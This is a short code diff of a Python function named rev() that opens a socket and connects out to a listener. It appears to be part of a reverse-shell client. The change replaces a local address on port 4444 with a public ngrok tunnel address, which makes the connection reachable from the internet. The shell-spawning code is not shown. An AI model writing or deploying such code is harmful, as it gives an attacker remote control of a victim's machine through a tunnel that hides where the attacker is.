@@ -9,7 +9,7 @@ def rev():
    s = socket.socket()
 
    try:
-       s.connect(('192.168.1.16', 4444))
+       s.connect(('0.tcp.eu.ngrok.io', 17517))
    except ConnectionRefusedError as e:
        print(f'refused ... Check if listener is running.')
        return
